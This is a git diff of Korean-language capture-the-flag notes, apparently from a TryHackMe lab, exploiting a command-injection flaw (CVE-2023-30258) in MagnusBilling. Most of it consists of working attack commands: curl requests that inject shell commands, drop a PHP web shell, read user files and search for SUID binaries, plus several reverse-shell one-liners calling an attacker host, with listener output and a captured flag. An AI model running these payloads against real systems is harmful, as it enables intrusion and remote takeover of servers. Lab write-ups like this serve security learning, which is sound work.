@@ -3,14 +3,14 @@
 hint: https://github.com/MarkLee131/awesome-web-pocs/blob/main/CVE-2023-30258.md
 
 ## 🎯 타겟 시스템 정보
-- **IP**: 10.10.86.223
+- **IP**: 10.10.13.178
 - **OS**: Linux (Debian 기반)
 
 ## 📡 1단계: 초기 포트 스캔 및 서비스 발견
 
 ### Nmap 스캔 결과
 ```bash
-nmap -Pn -sC -sV -oN scan.txt -p- 10.10.86.223
+nmap -Pn -sC -sV -oN scan.txt -p- 10.10.13.178
 ```
 
 **발견된 서비스:**
@@ -30,7 +30,7 @@ nmap -Pn -sC -sV -oN scan.txt -p- 10.10.86.223
 ### A. HTTP 서비스 (포트 80) - MagnusBilling 발견
 ```bash
 # 웹 서버 확인
-curl -s http://10.10.86.223/mbilling/ | grep -i version
+curl -s http://10.10.13.178/mbilling/ | grep -i version
 ```
 
 **발견된 애플리케이션**: MagnusBilling (VoIP 빌링 시스템)
@@ -38,7 +38,7 @@ curl -s http://10.10.86.223/mbilling/ | grep -i version
 ### B. Asterisk Call Manager (포트 5038)
 ```bash
 # Asterisk 서비스 연결 테스트
-nc -nv 10.10.86.223 5038
+nc -nv 10.10.13.178 5038
 ```
 
 **연결 결과:**
@@ -77,8 +77,8 @@ searchsploit magnus
 **PoC (Proof of Concept):**
 ```bash
 # 기본 명령어 주입 테스트
-curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=zzz.php;"
-curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=zzz.php%3Becho%20%27<?php%20system(%24_GET%5B%22cmd%22%5D);%20?>%27%20%3E%20zzz.php"
+curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=zzz.php;"
+curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=zzz.php%3Becho%20%27<?php%20system(%24_GET%5B%22cmd%22%5D);%20?>%27%20%3E%20zzz.php"
 
 # %3B는 세미콜론(;)의 URL 인코딩
 # 세미콜론으로 명령어를 체인화하여 추가 명령 실행 가능
@@ -96,39 +96,39 @@ curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=zzz.php%3Becho%20
 #### 1. 연결 상태 재확인
 ```bash
 # 포트 상태 재확인
-nmap -p 80,22,3306,5038 10.10.86.223
+nmap -p 80,22,3306,5038 10.10.13.178
 ```
 
 #### 2. 웹 서비스 접근성 테스트
 ```bash
 # 웹 서버 응답 확인
-curl -I http://10.10.86.223/
-curl -I http://10.10.86.223/mbilling/
+curl -I http://10.10.13.178/
+curl -I http://10.10.13.178/mbilling/
 
 # robots.txt 내용 확인
-curl http://10.10.86.223/robots.txt
+curl http://10.10.13.178/robots.txt
 ```
 
 #### 3. Command Injection 취약점 테스트
 ```bash
 # 5초 지연되면 명령어가 실행된 것
-time curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Bsleep%205"
+time curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Bsleep%205"
 # 결과를 웹에서 접근 가능한 위치에 저장
-curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Bwhoami%20%3E%20/var/www/html/mbilling/result.txt"
+curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Bwhoami%20%3E%20/var/www/html/mbilling/result.txt"
 
 # 저장된 결과 확인
-curl "http://10.10.86.223/mbilling/result.txt"
+curl "http://10.10.13.178/mbilling/result.txt"
 
 # 1단계: 기본 명령어 실행 테스트
-curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Bwhoami"
+curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Bwhoami"
 
 # 2단계: 시스템 정보 수집
-curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Bid"
-curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Buname%20-a"
+curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Bid"
+curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Buname%20-a"
 
 # 3단계: 파일 시스템 탐색
-curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Bls%20-la"
-curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Bpwd"
+curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Bls%20-la"
+curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Bpwd"
 ```
 
 #### 4. 리버스 쉘 시도
@@ -153,30 +153,30 @@ p: port number
 # %3C => <    # stdin
 
 # 디코딩
-curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test;bash -c 'bash -i >& /dev/tcp/10.8.136.212/4444 0>&1'"
+curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test;bash -c 'bash -i >& /dev/tcp/10.8.136.212/4444 0>&1'"
 # 인코딩
-curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.8.136.212/4444%200%3E%261%27"
+curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.8.136.212/4444%200%3E%261%27"
 # bash 사용 시 ambiguous redirect 에러 발생 원인 파악중
 ┌──(root㉿docker-desktop)-[/]
 └─# nc -lvnp 4444
 listening on [any] 4444 ...
-connect to [10.8.136.212] from (UNKNOWN) [10.10.86.223] 59270
+connect to [10.8.136.212] from (UNKNOWN) [10.10.13.178] 59270
 bash: line 1: 1.txt: ambiguous redirect
 
 # 리스너 먼저 시작
 nc -lvnp 4444
 # 단순
-curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test;bash -c 'bash -i 2>&1 | nc 10.8.136.212 4444'"
-curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Bbash%20-c%20%27bash%20-i%202%3E%261%20%7C%20nc%2010.8.136.212%204444%27"
+curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test;bash -c 'bash -i 2>&1 | nc 10.8.136.212 4444'"
+curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Bbash%20-c%20%27bash%20-i%202%3E%261%20%7C%20nc%2010.8.136.212%204444%27"
 # 더 안정적인
-curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.8.136.212 4444 > /tmp/f"
-curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Brm%20/tmp/f%3Bmkfifo%20/tmp/f%3Bcat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%2010.8.136.212%204444%20%3E/tmp/f"
+curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.8.136.212 4444 > /tmp/f"
+curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Brm%20/tmp/f%3Bmkfifo%20/tmp/f%3Bcat%20/tmp/f%7C/bin/sh%20-i%202%3E%261%7Cnc%2010.8.136.212%204444%20%3E/tmp/f"
 
 # 리버스 쉘 시도 2차 -> 연결은 되나 에러
 ─(root㉿docker-desktop)-[/tmp]
 └─# nc -lvvnp 4444
 listening on [any] 4444 ...
-connect to [10.8.136.212] from (UNKNOWN) [10.10.86.223] 38228
+connect to [10.8.136.212] from (UNKNOWN) [10.10.13.178] 38228
 /bin/sh: 0: can't access tty; job control turned off
 $ 
 
@@ -184,11 +184,11 @@ $
 #### 5. 추가 이뉴머레이션
 ```bash
 # 디렉토리 브루트포싱 재시도
-gobuster dir -u http://10.10.86.223/mbilling/ -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://10.10.13.178/mbilling/ -w /usr/share/wordlists/dirb/common.txt
 
 # 설정 파일 접근 시도
-curl http://10.10.86.223/mbilling/config/config.conf.php
-curl http://10.10.86.223/mbilling/config/
+curl http://10.10.13.178/mbilling/config/config.conf.php
+curl http://10.10.13.178/mbilling/config/
 ```
 
 
@@ -196,8 +196,8 @@ curl http://10.10.86.223/mbilling/config/
 ```bash
 # MySQL 연결 시도
 apt instsall maria-client
-mysql -h 10.10.86.223 -u root -p
-mysql -h 10.10.86.223 -u admin -p
+mysql -h 10.10.13.178 -u root -p
+mysql -h 10.10.13.178 -u admin -p
 ```
 
 
@@ -218,30 +218,44 @@ cat /usr/share/exploitdb/exploits/multiple/webapps/52170.txt
 http://magnusbilling/lib/icepay/icepay.php?democ=testfile; id > /tmp/injected.txt
 
 
-curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Bwhoami%20%3E%20/var/www/html/mbilling/real_test.txt"
-curl "http://10.10.86.223/mbilling/real_test.txt"
+curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Bwhoami%20%3E%20/var/www/html/mbilling/real_test.txt"
+curl "http://10.10.13.178/mbilling/real_test.txt"
 
 nc -lvnp 4444  # 터미널 1
 # 터미널 2에서:
-curl "http://10.10.86.223/mbilling/lib/icepay/icepay.php?democ=test%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.8.136.212/4444%200%3E%261%27"
+curl "http://10.10.13.178/mbilling/lib/icepay/icepay.php?democ=test%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.8.136.212/4444%200%3E%261%27"
 
 
 ## 커맨드 인젝션 -> 직접적인 인젝션을 해도 원격지에서 실행이 되므로 내가 확인은 불가능 -> 파일로 저장되게 한 후 -> http 로 접근해서 웹에서 확인하기
 
-LHOST=10.8.136.212
-LPORT=4444
-TARGET='http://10.10.86.223/mbilling/lib/icepay/icepay.php'
+TARGET='http://10.10.13.178/mbilling/lib/icepay/icepay.php'
 
-payload=";id > /var/www/html/mbilling/lib/sangwoo"
+# Payload 생성
+# /var/www/html/는 Apache, Nginx 등 웹서버가 기본으로 사용하는 디렉토리이므로 접근하기 쉽도록 설정
+# id
+payload=";id > /var/www/html/mbilling/lib/id"
+# find user.txt
+payload=";find / -name user.txt > /var/www/html/mbilling/lib/find_user"
+# user.txt
+payload=";cat /home/magnus/user.txt > /var/www/html/mbilling/lib/ss"
+# find root.txt
+payload=";find / -name root.txt > /var/www/html/mbilling/lib/find_root"
+# suid 파일 찾기
+payload=";find / -perm -4000 -type f > /var/www/html/mbilling/lib/suid 2>/var/www/html/mbilling/lib/suid_err"
+
+# URL 인코딩 처리
 encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))")
-curl "${TARGET}?democ=test${encoded_payload}"
+# 디코딩 처리 확인
+echo -n "${encoded_payload}" | python3 -c "import urllib.parse, sys; print(urllib.parse.unquote(sys.stdin.read()))"
+# 결과 확인
 
-# 이후 결과 확인
-http http://10.10.86.223/mbilling/lib/
+curl --get --data-urlencode "payload=;cat /home/magnus/user.txt > /var/www/html/mbilling/lib/ss" "$TARGET"
+
+http http://10.10.13.178/mbilling/lib/
 
 
 ┌──(root㉿docker-desktop)-[/]
-└─# http http://10.10.86.223/mbilling/lib/sangwoo.txt
+└─# http http://10.10.13.178/mbilling/lib/sangwoo.txt
 HTTP/1.1 200 OK
 Accept-Ranges: bytes
 Connection: Keep-Alive
@@ -256,3 +270,27 @@ Server: Apache/2.4.62 (Debian)
 uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
 
 
+
+
+┌──(root㉿docker-desktop)-[/]
+└─# 
+# 이후 결과 확인
+http http://10.10.13.178/mbilling/lib/user.txt
+HTTP/1.1 200 OK
+Accept-Ranges: bytes
+Connection: Keep-Alive
+Content-Length: 38
+Content-Type: text/plain
+Date: Sun, 01 Jun 2025 12:31:58 GMT
+ETag: "26-63681d52221c2"
+Keep-Alive: timeout=5, max=100
+Last-Modified: Sun, 01 Jun 2025 12:31:54 GMT
+Server: Apache/2.4.62 (Debian)
+
+THM{4a6831d5f124b25eefb1e92e0f0da4ca}
+
+
+
+# 리버스쉘 2차 시도 성공
+nc -lvnp 443
+curl 'http://10.10.13.178/mbilling/lib/icepay/icepay.php' --get --data-urlencode 'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.136.212 443 >/tmp/f;'
